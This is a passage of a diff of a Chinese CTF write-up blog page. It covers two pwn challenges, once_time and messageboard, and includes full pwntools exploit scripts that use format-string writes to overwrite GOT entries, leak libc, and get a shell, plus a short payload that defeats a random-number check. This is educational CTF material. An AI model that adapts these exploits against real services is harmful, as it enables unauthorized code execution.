-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">p = process(<span class="string">'./once_time'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./once_time'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">one_gadget_offset = <span class="number">0xf1147</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">'&gt;&gt;&gt; REPLACE __stack_chk_fail WITH main &lt;&lt;&lt;'</span>)</span><br><span class="line">main = <span class="number">0x400983</span></span><br><span class="line">stack_chk_fail_got = elf.got[<span class="string">'__stack_chk_fail'</span>]</span><br><span class="line">p.recvuntil(<span class="string">'input your name: '</span>)</span><br><span class="line">p.sendline(p64(stack_chk_fail_got))</span><br><span class="line">p.recvuntil(<span class="string">'leave a msg: '</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%12$n'</span>.format(str(main))</span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">'\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> repr(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">info(<span class="string">'&gt;&gt;&gt; LEAK libc &lt;&lt;&lt;'</span>)</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">p.recvuntil(<span class="string">'input your name: '</span>)</span><br><span class="line">p.sendline(p64(read_got))</span><br><span class="line">p.recvuntil(<span class="string">'leave a msg: '</span>)</span><br><span class="line">payload = <span class="string">'%12$s'</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">'\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> repr(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line">data = p.recvuntil(<span class="string">'\x7f'</span>)</span><br><span class="line"><span class="keyword">print</span> u64(data[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">read_offset = libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">libc_base = u64(data[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - read_offset</span><br><span class="line"><span class="comment"># libc.address = read - read_offset</span></span><br><span class="line">success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line">success(<span class="string">'one_gadget = '</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">info(<span class="string">'&gt;&gt;&gt; FMTSTR ATTACK &lt;&lt;&lt;'</span>)</span><br><span class="line">info(<span class="string">'FIRST WORD'</span>)</span><br><span class="line">info(hex(one_gadget &amp; <span class="number">0xFFFF</span>))</span><br><span class="line">exit_got = elf.got[<span class="string">'exit'</span>]</span><br><span class="line">p.recvuntil(<span class="string">'input your name: '</span>)</span><br><span class="line">p.sendline(p64(exit_got))</span><br><span class="line">p.recvuntil(<span class="string">'leave a msg: '</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%12$hn'</span>.format(str(one_gadget &amp; <span class="number">0xFFFF</span>))<span class="comment">#取最低的双字节并对齐</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">'\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> repr(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">info(<span class="string">'SECOND WORD'</span>)</span><br><span class="line">info(hex((one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>))</span><br><span class="line">p.recvuntil(<span class="string">'input your name: '</span>)</span><br><span class="line">p.sendline(p64(exit_got + <span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">'leave a msg: '</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%12$hn'</span>.format(str((one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">'\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> repr(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">info(<span class="string">'THIRD WORD'</span>)</span><br><span class="line">info(hex((one_gadget &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFF</span>))</span><br><span class="line">p.recvuntil(<span class="string">'input your name: '</span>)</span><br><span class="line">p.sendline(p64(exit_got + <span class="number">4</span>))</span><br><span class="line">p.recvuntil(<span class="string">'leave a msg: '</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%12$hn'</span>.format(str((one_gadget &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFF</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">'\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> repr(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">info(<span class="string">'FOURTH WORD'</span>)</span><br><span class="line">info(hex((one_gadget &gt;&gt; <span class="number">48</span>) &amp; <span class="number">0xFFFF</span>))</span><br><span class="line">p.recvuntil(<span class="string">'input your name: '</span>)</span><br><span class="line">p.sendline(p64(exit_got + <span class="number">6</span>))</span><br><span class="line">p.recvuntil(<span class="string">'leave a msg: '</span>)</span><br><span class="line"><span class="keyword">if</span> (one_gadget &gt;&gt; <span class="number">48</span>) &amp; <span class="number">0xFFFF</span> != <span class="number">0</span>:</span><br><span class="line">    payload = <span class="string">'%&#123;&#125;c%12$hn'</span>.format(str((one_gadget &gt;&gt; <span class="number">48</span>) &amp; <span class="number">0xFFFF</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    payload = <span class="string">'%12$hn'</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">'\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> repr(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'input your name: '</span>)</span><br><span class="line">p.sendline(<span class="string">'root'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'leave a msg: '</span>)</span><br><span class="line">p.sendline(<span class="string">'%p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">success(<span class="string">'&gt;&gt;&gt; PWNED BY ASSASSINQ &lt;&lt;&lt;'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="messageboard"><a href="#messageboard" class="headerlink" title="messageboard"></a>messageboard</h2><p>这题大佬们都用堆做，然而我一点都不会。后来神仙 pizza 给了一种<code>format string</code>的超简单做法。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] '/home/assassinq/Desktop/messageboard'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+<pre><code class="gdb">0008| 0x7fffffffdc10 (&quot;BBBBBBBB\n&quot;) ; 第二次输入
+0016| 0x7fffffffdc18 --&gt; 0xa (&#39;\n&#39;)
+0024| 0x7fffffffdc20 --&gt; 0x0
+0032| 0x7fffffffdc28 --&gt; 0x8e2d258951a85400
+0040| 0x7fffffffdc30 --&gt; 0x7fffffffdc60 --&gt; 0x400a20 (push   r15)
+0048| 0x7fffffffdc38 --&gt; 0x400a08 (mov    rcx,QWORD PTR [rbp-0x8])
+0056| 0x7fffffffdc40 (&quot;AAAAAAAA&quot;) ; 第一次输入
+</code></pre>
+<p>调试出来可以看到第一次输入位于第二次输入后的第六个参数，64 位下偏移就是 12。为了达到触发 <code>__stack_chk_fail</code> 的目的，我们还需要覆盖掉 Canary，位于第二次输入后的第三个参数处，故至少需要输入大于 24 个字符。read 总共读 0x20 个字符，我们这里也就读 0x20 个，以触发 <code>__stack_chk_fail</code>。</p>
+<p>第二步利用 <code>read</code> 的 got 表将 libc 基址泄漏出来。然后在已知 libc 版本的情况下，第三步将 <code>exit</code> 的 got 表覆盖成 one_gadget。最后送个 <code>%p</code> 或者 <code>$p</code> 上去 getshell。exp 如下：</p>
+<pre><code class="python">#!/usr/bin/env python
+#coding=utf-8
+from pwn import *
+# context.log_level = &#39;debug&#39;
+context.arch = &#39;amd64&#39;
+p = process(&#39;./once_time&#39;)
+elf = ELF(&#39;./once_time&#39;)
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+one_gadget_offset = 0xf1147
+
+info(&#39;&gt;&gt;&gt; REPLACE __stack_chk_fail WITH main &lt;&lt;&lt;&#39;)
+main = 0x400983
+stack_chk_fail_got = elf.got[&#39;__stack_chk_fail&#39;]
+p.recvuntil(&#39;input your name: &#39;)
+p.sendline(p64(stack_chk_fail_got))
+p.recvuntil(&#39;leave a msg: &#39;)
+payload = &#39;%{}c%12$n&#39;.format(str(main))
+payload = payload.ljust(0x20, &#39;\x00&#39;)
+print repr(payload)
+p.send(payload)
+
+info(&#39;&gt;&gt;&gt; LEAK libc &lt;&lt;&lt;&#39;)
+read_got = elf.got[&#39;read&#39;]
+p.recvuntil(&#39;input your name: &#39;)
+p.sendline(p64(read_got))
+p.recvuntil(&#39;leave a msg: &#39;)
+payload = &#39;%12$s&#39;
+payload = payload.ljust(0x20, &#39;\x00&#39;)
+print repr(payload)
+p.send(payload)
+data = p.recvuntil(&#39;\x7f&#39;)
+print u64(data[-6:].ljust(8, &#39;\x00&#39;))
+read_offset = libc.symbols[&#39;read&#39;]
+libc_base = u64(data[:6].ljust(8, &#39;\x00&#39;)) - read_offset
+# libc.address = read - read_offset
+success(&#39;libc_base = &#39; + hex(libc_base))
+
+one_gadget = libc_base + one_gadget_offset
+success(&#39;one_gadget = &#39; + hex(one_gadget))
+
+info(&#39;&gt;&gt;&gt; FMTSTR ATTACK &lt;&lt;&lt;&#39;)
+info(&#39;FIRST WORD&#39;)
+info(hex(one_gadget &amp; 0xFFFF))
+exit_got = elf.got[&#39;exit&#39;]
+p.recvuntil(&#39;input your name: &#39;)
+p.sendline(p64(exit_got))
+p.recvuntil(&#39;leave a msg: &#39;)
+payload = &#39;%{}c%12$hn&#39;.format(str(one_gadget &amp; 0xFFFF))#取最低的双字节并对齐
+payload = payload.ljust(0x20, &#39;\x00&#39;)
+print repr(payload)
+p.send(payload)
+
+info(&#39;SECOND WORD&#39;)
+info(hex((one_gadget &gt;&gt; 16) &amp; 0xFFFF))
+p.recvuntil(&#39;input your name: &#39;)
+p.sendline(p64(exit_got + 2))
+p.recvuntil(&#39;leave a msg: &#39;)
+payload = &#39;%{}c%12$hn&#39;.format(str((one_gadget &gt;&gt; 16) &amp; 0xFFFF))
+payload = payload.ljust(0x20, &#39;\x00&#39;)
+print repr(payload)
+p.send(payload)
+
+info(&#39;THIRD WORD&#39;)
+info(hex((one_gadget &gt;&gt; 32) &amp; 0xFFFF))
+p.recvuntil(&#39;input your name: &#39;)
+p.sendline(p64(exit_got + 4))
+p.recvuntil(&#39;leave a msg: &#39;)
+payload = &#39;%{}c%12$hn&#39;.format(str((one_gadget &gt;&gt; 32) &amp; 0xFFFF))
+payload = payload.ljust(0x20, &#39;\x00&#39;)
+print repr(payload)
+p.send(payload)
+
+info(&#39;FOURTH WORD&#39;)
+info(hex((one_gadget &gt;&gt; 48) &amp; 0xFFFF))
+p.recvuntil(&#39;input your name: &#39;)
+p.sendline(p64(exit_got + 6))
+p.recvuntil(&#39;leave a msg: &#39;)
+if (one_gadget &gt;&gt; 48) &amp; 0xFFFF != 0:
+    payload = &#39;%{}c%12$hn&#39;.format(str((one_gadget &gt;&gt; 48) &amp; 0xFFFF))
+else:
+    payload = &#39;%12$hn&#39;
+payload = payload.ljust(0x20, &#39;\x00&#39;)
+print repr(payload)
+p.send(payload)
+
+p.recvuntil(&#39;input your name: &#39;)
+p.sendline(&#39;root&#39;)
+p.recvuntil(&#39;leave a msg: &#39;)
+p.sendline(&#39;%p&#39;)
+p.recvuntil(&#39;\n&#39;)
+success(&#39;&gt;&gt;&gt; PWNED BY ASSASSINQ &lt;&lt;&lt;&#39;)
+p.interactive()
+</code></pre>
+<h2 id="messageboard"><a href="#messageboard" class="headerlink" title="messageboard"></a>messageboard</h2><p>这题大佬们都用堆做，然而我一点都不会。后来神仙 pizza 给了一种 <code>format string</code> 的超简单做法。</p>
+<pre><code class="shell">[*] &#39;/home/assassinq/Desktop/messageboard&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre>
 <p>拖进 ida 里，典型的堆题的形式，这里只看第四个选项：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">getshell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// ST04_4</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  __int128 v3; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  __int64 *v4; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 (__fastcall *v6)(_QWORD, _QWORD); <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"guess a number:"</span>);</span><br><span class="line">  v3 = <span class="number">0u</span>LL;</span><br><span class="line">  v5 = command;</span><br><span class="line">  v6 = (__int64 (__fastcall *)(_QWORD, _QWORD))((<span class="keyword">char</span> *)getshell + <span class="number">317</span>);</span><br><span class="line">  readline((__int64)nptr, <span class="number">0x18</span>u);</span><br><span class="line">  fd = open(<span class="string">"/dev/random"</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;v3, <span class="number">2u</span>LL);</span><br><span class="line">  read(fd, (<span class="keyword">char</span> *)&amp;v3 + <span class="number">8</span>, <span class="number">2u</span>LL);</span><br><span class="line">  v2 = atoi(nptr);</span><br><span class="line">  v4 = &amp;v2;</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"you guess "</span>, (<span class="keyword">char</span> *)&amp;v3 + <span class="number">8</span>);</span><br><span class="line">  <span class="built_in">printf</span>(nptr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">" the answer is %lld \n"</span>, (_QWORD)v3 + *((_QWORD *)&amp;v3 + <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">if</span> ( *v4 != (_QWORD)v3 + *((_QWORD *)&amp;v3 + <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"GG!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  system(command);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="cpp">unsigned __int64 getshell()
+{
+  int fd; // ST04_4
+  __int64 v2; // [rsp+8h] [rbp-58h]
+  __int128 v3; // [rsp+28h] [rbp-38h]
+  __int64 *v4; // [rsp+38h] [rbp-28h]
+  char *v5; // [rsp+40h] [rbp-20h]
+  __int64 (__fastcall *v6)(_QWORD, _QWORD); // [rsp+48h] [rbp-18h]
+  unsigned __int64 v7; // [rsp+58h] [rbp-8h]
+
+  v7 = __readfsqword(0x28u);
+  printf(&quot;guess a number:&quot;);
+  v3 = 0uLL;
+  v5 = command;
+  v6 = (__int64 (__fastcall *)(_QWORD, _QWORD))((char *)getshell + 317);
+  readline((__int64)nptr, 0x18u);
+  fd = open(&quot;/dev/random&quot;, 0);
+  read(fd, &amp;v3, 2uLL);
+  read(fd, (char *)&amp;v3 + 8, 2uLL);
+  v2 = atoi(nptr);
+  v4 = &amp;v2;
+  sleep(1u);
+  printf(&quot;you guess &quot;, (char *)&amp;v3 + 8);
+  printf(nptr);
+  printf(&quot; the answer is %lld \n&quot;, (_QWORD)v3 + *((_QWORD *)&amp;v3 + 1));
+  if ( *v4 != (_QWORD)v3 + *((_QWORD *)&amp;v3 + 1) )
+  {
+    puts(&quot;GG!&quot;);
+    exit(0);
+  }
+  system(command);
+  return __readfsqword(0x28u) ^ v7;
+}
+</code></pre>
 <p>可以看到这里让我们猜测一个系统产生的随机数，猜对了就能 getshell。再来看看 pizza 的 exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./messageboard'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'choice &gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'guess a number:'</span>)</span><br><span class="line">payload = <span class="string">'%2$*11$s%2$*12$s%13$n'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>关于<code>*</code>：宽度与精度格式化参数可以忽略，或者直接指定，或者用星号”<code>*</code>“表示取对应函数参数的值。例如<code>printf(&quot;%*d&quot;, 5, 10)</code>输出”<code>10</code>“；<code>printf(&quot;%.*s&quot;, 3, &quot;abcdef&quot;)</code>输出”<code>abc</code>“。</p>
+<pre><code class="python">from pwn import *
+p = process(&#39;./messageboard&#39;)
+p.recvuntil(&#39;choice &gt;&gt;&#39;)
+p.sendline(&#39;4&#39;)
+p.recvuntil(&#39;guess a number:&#39;)
+payload = &#39;%2$*11$s%2$*12$s%13$n&#39;
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>关于 <code>*</code>：宽度与精度格式化参数可以忽略，或者直接指定，或者用星号 <code>*</code> 表示取对应函数参数的值。例如 <code>printf(&quot;%*d&quot;, 5, 10)</code> 输出 <code>10</code>；<code>printf(&quot;%.*s&quot;, 3, &quot;abcdef&quot;)</code> 输出 <code>abc</code>。</p>
 <p>由此可知，第十一位和第十二位参数上存放的是随机数，第十三位则是我们的输入，这里将随机数的值写入我们的输入，达到 getshell 的目的。</p>
 <p>堆的做法以后再来复现。</p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>比赛打下来，发现实力是重要的一部分，同时经验、技巧（猥琐发育）以及运气都是重要的因素。希望下次有更多的机会参与线下 AWD 比赛。</p>
 <h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://www.jianshu.com/p/b8e448951125" target="_blank" rel="noopener">https://www.jianshu.com/p/b8e448951125</a><br><a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2</a></p>
 
-      
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                      <a class="hover-with-bg" href="/tags/wp/">wp</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2018/08/30/2017-CSAW-Quals-realism/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>2017-CSAW-Quals-realism</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2018/08/11/2018-XMan个人排位赛/">
+                        <span>2018-XMan个人排位赛</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
     </div>
-    <footer class="entry-meta entry-footer">
-      
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/">wp</a></li></ul>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
 
-      
-        
-	<div id="comment">
-		<!-- 来必力City版安装代码 -->
-		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
-		<script type="text/javascript">
-		   (function(d, s) {
-		       var j, e = d.getElementsByTagName(s)[0];
-
-		       if (typeof LivereTower === 'function') { return; }
-
-		       j = d.createElement(s);
-		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-		       j.async = true;
-
-		       e.parentNode.insertBefore(j, e);
-		   })(document, 'script');
-		</script>
-		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
-		</div>
-		<!-- City版安装代码已完成 -->
-	</div>
-
-
-
-      
-    </footer>
-    <hr class="entry-footer-hr">
+      </div>
+    
   </div>
-  
+</div>
+
+<!-- Custom -->
+
+
     
-<nav id="article-nav">
+  </main>
+
   
-    <a href="/2018/08/30/2017-CSAW-Quals-realism/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          2017-CSAW-Quals-realism
-        
-      </div>
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
     </a>
   
-  
-    <a href="/2018/08/11/2018-XMan个人排位赛/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">2018-XMan个人排位赛</div>
-    </a>
-  
-</nav>
 
   
-</article>
-
-<!-- Table of Contents -->
-
-  <aside id="sidebar">
-    <div id="toc" class="toc-article">
-    <strong class="toc-title">Contents</strong>
-    
-      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#准备"><span class="nav-number">1.</span> <span class="nav-text">准备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#复现"><span class="nav-number">2.</span> <span class="nav-text">复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#once-time"><span class="nav-number">2.1.</span> <span class="nav-text">once_time</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#messageboard"><span class="nav-number">2.2.</span> <span class="nav-text">messageboard</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考网站"><span class="nav-number">4.</span> <span class="nav-text">参考网站</span></a></li></ol>
-    
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
     </div>
-  </aside>
+  </div>
+</div>
+  
 
-</section>
-        
-      </div>
+  
 
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="http://blog.b3ale.cn" target="_blank" rel="nofollow noopener"><b>Hard Work Pays Off.</b></a>
     </div>
-    <!-- <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-    <a href="/tags" class="mobile-nav-link">Tags</a>
-  
-    <a href="/about" class="mobile-nav-link">About</a>
-  
-</nav> -->
-    <footer id="footer" class="site-footer">
-  
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
 
-  <div class="clearfix container">
-      <div class="site-info">
-	      &copy; 2020 AssassinQ All Rights Reserved.
-        
-      </div>
-      <div class="site-credit">
-        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
-      </div>
+
+    
+
+    
   </div>
 </footer>
 
-
-<!-- min height -->
-
-<script>
-    var wrapdiv = document.getElementById("wrap");
-    var contentdiv = document.getElementById("content");
-
-    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
-    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
-
-
-    <!-- headerblur min height -->
-    
-      var headerblur = document.getElementById("header-blur");
-      headerblur.style.minHeight = window.getComputedStyle(document.getElementById("allheader"), null).height;
-    
-    
-</script>
-    
-<div style="display: none;">
-  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
-</div>
-
-<!-- mathjax config similar to math.stackexchange -->
-
